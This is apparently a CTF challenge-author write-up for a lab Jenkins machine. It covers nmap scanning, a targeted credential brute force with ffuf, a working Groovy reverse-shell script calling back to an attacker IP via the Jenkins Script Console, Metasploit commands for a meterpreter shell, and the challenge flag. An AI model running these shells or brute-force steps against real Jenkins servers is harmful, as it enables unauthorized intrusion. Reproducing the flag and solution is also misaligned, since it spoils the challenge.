---
tags:
  - InfraHacking
  - medium
  - ChallengeCreation
  - Jenkins
modified: 2024-09-04T14:19:43+08:00
---
## Challenge Description

>[!todo] Description
>
>Automation is becoming increasingly popular! This system's automated butler, however, seems a bit too friendly. Perhaps we could coerce it to see what kind of secrets it would reveal?
>
>Rules of Engagement:
>
>1. The flag is located at `/home/[username]/flag.txt`.
>2. The use of all forms of Nmap scanning is within scope of this challenge.
>3. The use of all forms of enumeration/brute forcing that is necessary to solve this challenge is within scope of this challenge.
>4. This machine DOES respond to ICMP (ping) requests. Be patient and don't just throw -Pn at the problem.
>
>- **Author:** Jun Wei
>- **Category:** infra
>- **Difficulty:** medium
>
>**Hints**
>- `We have ZERO information about valid usernames and passwords. What is the best way to break into this Jenkins dashboard?`  (50 points)

## Friendly Butler - Solution

This challenge is intended as a very straightforward, sequential challenge. The challenge structure is designed to be linear and beginner-friendly. The target machine deliberately has no rabbit holes or misleading ports. Only a single service is accessible on port 8080. Participants will begin by visiting `http://<target-IP>:8080`, which hosts a login page, and will then proceed through the steps following a standard ethical hacking methodology. 

The main objective of this challenge is to highlight the importance of creating target-specific credentials wordlists for authentication attacks. For instance, the methodology used for crafting an effective wordlist for authentication attacks is not only about using the largest available lists (like a raw rockyou.txt dump), but about efficiency and relevance.

A good practice is to:
1. Analyze and extract the top X number of lines (like top 10 or 100) from a major, common password file like rockyou.txt to capture the absolute most frequent and easily guessed passwords.
2. Compare this small list of highly frequent passwords with another password wordlist to ensure comprehensive coverage of common patterns.
3. Merge the small, high-frequency wordlists and remove any duplicates. 
4. In this final wordlist, do include some password entries associated with the platform/application/organisation, or even information gathered prior to this. E.g. if we find a username called john, add potential password permutations like john123, johnpass, etc.
5. This results in a more optimized wordlist that contains the passwords most likely to succeed (statistically).

> [!IMPORTANT]  
> It should be noted that this authentication attack method exploits human weaknesses and human nature. It relies on the fact that users (humans) prioritise convenience over security. For an organization of, say, 500 employees, the absence of a strong password policy almost guarantees the existence of many weak passwords, which attackers can easily try to exploit.

1. Perform an Nmap scan to find which ports are open and what services are running.

```bash
┌──(nepz㉿nepz)-[~]
└─$ nmap -sC -p- -sV 10.10.1.133
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-10 10:25 +08
Nmap scan report for 10.10.1.133
Host is up (0.015s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.41.v20210516
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(9.4.41.v20210516)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.57 seconds
```

From the output, we can see that only port 8080 is opening. The service identified is `http`, and the version is `Jetty 9.4.41.v20210516` (Jetty is an open-source Java-based web server).

2. We can first explore the Nmap scan results. It seems like the 1 disallowed entry was found in `robots.txt`, so we can go ahead and check that first. 

![[Friendly-Butler-1.png]]

As shown in the above image, visiting `http://<IP>:8080/robots.txt` didn't reveal anything useful. 

3. When we visit `http://<IP>:8080`, we should encounter a login page which states "Welcome to Jenkins!".

![[Friendly-Butler-2.png]]

We are not provided any credential material from the challenge description or anywhere else. This basically means we will need to bruteforce the login page by attempting authentication attack methods.

4. Begin by capturing the HTTP POST request that is sent when we attempt to sign in with random credentials.

```http
POST /j_spring_security_check HTTP/1.1
Host: 10.10.1.133:8080
Content-Length: 57
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://10.10.1.133:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.1.133:8080/login?from=%2F
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID.82c8270f=node01ccthx5pr0os8ln02h0yxhydu249.node0
Connection: keep-alive

j_username=FUZZUSER&j_password=FUZZPASS&from=%2F&Submit=Sign+in
```

Since I am planning to use `ffuf` to perform the authentication attack, I have changed the username value to `FUZZUSER` and password value to `FUZZPASS`.

I have also attached a screenshot that shows the application's response to a failed login attempt

![[Friendly-Butler-3.png]]

From the response, it can be concluded that we can filter for the `loginError` line when performing our authentication attack later.

5. Now we need to devise a strategy for this attack.

Let's sum up what we have at the moment:
- We have encountered a login page, which we will be targeting.
- We do not know any valid usernames.
- We do not know any valid passwords.
- There are no other open ports or places where we can get information about credentials.
- We are (probably) unable to advance without getting pass this login page.
- The `Location` value in the HTTP response (`/loginError`) is a good indicator that indicates whether our authentication attempt has failed/succeeded.

Based on our circumstances, our best strategy is probably to run a clusterbomb attack with a list of possible usernames and a list of possible passwords.

Here's how a clusterbomb attack works. Assume we have a username list like this:

```
alice
bob
charlie
```

And our password list contains:

```
abc
def
123
```

In a clusterbomb attack, each username will be paired with a password and each set of credentials will be tested. This means that there are a total of 9 (3*3) combinations of credentials that can be tested in our very simple example:

```
alice:abc
alice:def
alice:123
bob:abc
bob:def
bob:123
charlie:abc
charlie:def
charlie:123
```

A clusterbomb attack is probably the best attack we can run right now, since we have no clue what credentials are valid and can only rely on statistical analysis and application-specific password attempts.

6. To compile a list of usernames, we can use a short list like `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`. Remove any weird usernames that are probably not going to be valid, since we are aiming to have a short list of usernames and passwords (excessive attempts usually take a lot of time + may get flagged).

```bash
┌──(nepz㉿nepz)-[~]
└─$ cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt
root
admin
test
guest
info
adm
mysql
user
administrator
oracle
ftp
pi
puppet
ansible
ec2-user
vagrant
azureuser

┌──(nepz㉿nepz)-[~]
└─$ cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt > users.txt

┌──(nepz㉿nepz)-[~]
└─$ mousepad users.txt

┌──(nepz㉿nepz)-[~]
└─$ cat users.txt
root
admin
test
guest
info
adm
user
administrator
jenkins
```

By removing usernames that are not relevant (e.g. `puppet`) in our context and including `jenkins` (application-specific username), we now have a final username list of 9 usernames stored in a file called `users.txt`.

7. We will proceed to create our own password wordlist. Typically, password wordlists are extremely long and contain many breached/weak/common passwords found in real-world scenarios. However, using a wordlist like that will probably not be a good idea because we are running a clusterbomb attack, where the total number of auth attempts = `number of usernames in username list * number of passwords in password list`.

Instead, we are going to compile a list of top passwords from a few different wordlists, remove any duplicates, and supply our own target-specific passwords. This should give us the best chance of breaking in (as explained at the very top of this writeup).

```bash
┌──(nepz㉿nepz)-[~]
└─$ cat /usr/share/wordlists/rockyou.txt | head -n 10
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123

┌──(nepz㉿nepz)-[~]
└─$ cat /usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt | head -n 10
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon

┌──(nepz㉿nepz)-[~]
└─$ cat /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt | head -n 10
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
```

The above shows the first 10 lines of 3 password wordlists:
- `/usr/share/wordlists/rockyou.txt`
- `/usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt `
- `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt`

Many entries are repeated, so we will need to clean those up:

```bash
┌──(nepz㉿nepz)-[~]
└─$ cat /usr/share/wordlists/rockyou.txt | head -n 10 > passwords.txt

┌──(nepz㉿nepz)-[~]
└─$ cat /usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt | head -n 10  >> passwords.txt

┌──(nepz㉿nepz)-[~]
└─$ cat /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt | head -n 10 >> passwords.txt

┌──(nepz㉿nepz)-[~]
└─$ wc -l passwords.txt
30 passwords.txt

┌──(nepz㉿nepz)-[~]
└─$ sort -u passwords.txt > pw.txt

┌──(nepz㉿nepz)-[~]
└─$ wc -l pw.txt
14 pw.txt
```

After removing duplicates, we should have a file containing a reasonable number of passwords to test. The final step will be to supply our target-specific password attempts.

In this example, I have included `jenkins`, `Jenkins`, `jetty` and `Jetty`, as these keywords were found previously from the Nmap scan and manual information gathering.

```bash
┌──(nepz㉿nepz)-[~]
└─$ mousepad pw.txt

┌──(nepz㉿nepz)-[~]
└─$ cat pw.txt
111111
1234
12345
123456
1234567
12345678
123456789
abc123
dragon
iloveyou
password
princess
qwerty
rockyou
jenkins
Jenkins
jetty
Jetty
```

8. We can now perform the attack using `ffuf`:

```bash
ffuf -request req.txt -request-proto http -mode clusterbomb -w users.txt:FUZZUSER -w pw.txt:FUZZPASS -fr "loginError"
```

Note:
- `-mode clusterbomb` is specified since we are performing a clusterbomb attack.
- The `users.txt` entries will be substitued into the `FUZZUSER` placeholder value. The same concept applies for the passwords. 
- `-fr "loginError"` is a filter that filters out any authentication errors, so that only successful attempts are displayed.

```bash
┌──(nepz㉿nepz)-[~]
└─$ ffuf -request req.txt -request-proto http -mode clusterbomb -w users.txt:FUZZUSER -w pw.txt:FUZZPASS -fr "loginError"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.1.133:8080/j_spring_security_check
 :: Wordlist         : FUZZUSER: /home/kali/users.txt
 :: Wordlist         : FUZZPASS: /home/kali/pw.txt
 :: Header           : Referer: http://10.10.1.133:8080/login?from=%2F
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Host: 10.10.1.133:8080
 :: Header           : Cache-Control: max-age=0
 :: Header           : Accept-Language: en-US
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 :: Header           : Connection: keep-alive
 :: Header           : Origin: http://10.10.1.133:8080
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: JSESSIONID.82c8270f=node01ccthx5pr0os8ln02h0yxhydu249.node0
 :: Data             : j_username=FUZZUSER&j_password=FUZZPASS&from=%2F&Submit=Sign+in
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: loginError
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2960ms]
    * FUZZPASS: jenkins
    * FUZZUSER: admin

:: Progress: [162/162] :: Job [1/1] :: 50 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

As we can see, `ffuf` has identified a set of valid credentials that we can now use to authenticate. 

9. Upon successful authentication, we should be able to see the Jenkins dashboard.

![[Friendly-Butler-4.png]]

There are a lot of things we can do after gaining access to the Jenkins dashboard. Jenkins has many inherent vulnerabilities due to its plugins and built-in functionality. 

10. Click `Manage Jenkins` and scroll down all the way. There should be a section called `Tools and Actions`, which contains something known as `Script Console`!

![[Friendly-Butler-5.png]]

We will be met with an interesting description that states:

```
Type in an arbitrary Groovy script and execute it on the server. Useful for trouble-shooting and diagnostics. Use the ‘println’ command to see the output (if you use System.out, it will go to the server’s stdout, which is harder to see.) Example:

println(Jenkins.instance.pluginManager.plugins)
All the classes from all the plugins are visible. jenkins.*, jenkins.model.*, hudson.*, and hudson.model.* are pre-imported.
```

![[Friendly-Butler-6.png]]

11. Now, we know that we can submit a Groovy script and run it. An example Groovy reverse shell script can be found from https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76.

We will need to change the following values:
- host: change to IP address of your attacker machine
- port: change to any port number of your choice
- cmd: change from `cmd.exe` (Windows Command Prompt) to `/bin/bash` (Bash) since the target system isn't Windows

```groovy
String host="172.18.87.66";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

12. By submitting an appropriate Groovy script, we should be able to receive a connection in a Netcat reverse shell (`nc -nvlp 4444`).

```bash
┌──(nepz㉿nepz)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [172.18.87.66] from (UNKNOWN) [172.18.80.1] 64485
whoami
administrator
which python
which python3
/usr/bin/python3
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
administrator@administrator-virtual-machine:/$ pwd
pwd
/
administrator@administrator-virtual-machine:/$ cd
cd
administrator@administrator-virtual-machine:~$ ls
ls
Desktop    Downloads  Music     Public  Templates
Documents  flag.txt   Pictures  snap    Videos
administrator@administrator-virtual-machine:~$ cat flag.txt
cat flag.txt
HNF25{fr1end1y_bUt13r_4t_y0ur_s3rv1c3}
administrator@administrator-virtual-machine:~$
```

The flag is stored in `/home/administrator/flag.txt`! It's optional to upgrade to a TTY shell, but if we want to do it we can run the following command:

```bash
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
```

13. Anyways, there is also a Metasploit module (`exploit/multi/http/jenkins_script_console`) that we can use after we have gotten some credentials. It will basically exploit the Jenkins script console tool also, but this time it's much more automated and we do not need to enter a Groovy reverse shell script on our own.

![[Friendly-Butler-7.png]]

Here are the commands we need to run:

```bash
msfconsole
```

```bash
use exploit/multi/http/jenkins_script_console
```

```bash
show targets 
```

```bash
set target 1
```

```bash
set payload linux/x64/meterpreter/reverse_tcp
```

```bash
set rhosts 10.10.1.133
```

```bash
set rport 8080
```

```bash
set targeturi /
```

```bash
set username admin
```

```bash
set password jenkins
```

```bash
exploit
```

After setting the appropriate options and running the exploit module, we should be able to get a Meterpreter shell back!

![[Friendly-Butler-8.png]]

Flag: `HNF25{fr1end1y_bUt13r_4t_y0ur_s3rv1c3}`